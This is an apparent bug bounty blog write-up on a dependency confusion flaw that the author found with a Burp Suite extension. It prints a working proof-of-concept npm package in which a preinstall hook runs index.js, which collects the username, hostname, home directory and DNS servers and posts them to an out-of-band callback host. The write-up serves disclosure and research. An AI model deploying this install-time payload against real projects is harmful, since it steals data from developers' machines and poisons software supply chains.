---
layout: post
title: Remote Code Execution through Dependency injection using Burpsuite Extension
date: 2023-08-19 15:08 +0530
categories: [bugbounty, writeup]
tags: [bugbounty,rce] 
---


## Introduction

Dependency Confusion is a security vulnerability that affects software dependencies in the software development process. It occurs when a public package manager installs an internal or private package with the same name as an external public package. An attacker can exploit this vulnerability by uploading a malicious package to the public package repository.

## Discovery

I was testing a bug bounty target when I noticed that the extension [JS-Miner](https://portswigger.net/bappstore/0ab7a94d8e11449daaf0fb387431225b) flagged a dependency issue in the target application. The issue involved a JavaScript file that referenced an organization called **private-progrm-widget/widget1**. However, this organization was not found in the NPM registry. An attacker can create a fake package that is named `private-progrm-widget` and then create a module name `widget1` and upload that to the NPM registry. When the target application tries to install this package, it will actually install the attacker's malicious code.

![JS-miner](https://github.com/Jineeshak/jineeshak.github.io/blob/main/assets/img/JS4.png?raw=true)

For the proof of concept, I created the following `index.js` and `package.json` files and published them to [npmjs.com](http://npmjs.com/) under the name **private-progrm-widget/widget module** :


#### index.js

```jsx
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const packageJSON = require("./package.json");
const package = packageJSON.name;

const trackingData = JSON.stringify({
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: dns.getServers(),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "chehzb52vtc0000bsfaggeze9iwyyyyyb.oast.fun",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();

```

#### package.json

```json
{
  "name": "@private-progrm-widget/widget",
  "version": "5.0.4",
  "description": "null",
  "main": "index.js",
  "scripts": {
    "test": "echo \\"Error: no test specified\\" && exit 1",
    "preinstall": "node index.js"
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "dependencies": {
    "@private-progrm-widget/widget": "^5.0.4"
  }
}

```

When a user installs this module, it retrieves their username and current working directory. After waiting for a while, the following HTTP calls were logged to my [interact.sh](http://interact.sh/) server, confirming the execution of the `index.js` file.

![Remote%20Code%20Execution%20using%20Dependency%20Confusion%20bbc9d0cfc912465883f0d0f3d55ffa68/Screenshot_2023-05-23_at_5.20.20_PM.png](https://github.com/Jineeshak/jineeshak.github.io/blob/main/assets/img/JS2.png?raw=true)

Reference: [https://dhiyaneshgeek.github.io/web/security/2021/09/04/dependency-confusion/](https://dhiyaneshgeek.github.io/web/security/2021/09/04/dependency-confusion/)